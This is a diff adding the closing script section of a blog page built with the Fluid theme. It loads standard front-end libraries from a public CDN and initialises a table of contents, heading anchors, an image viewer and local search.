+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
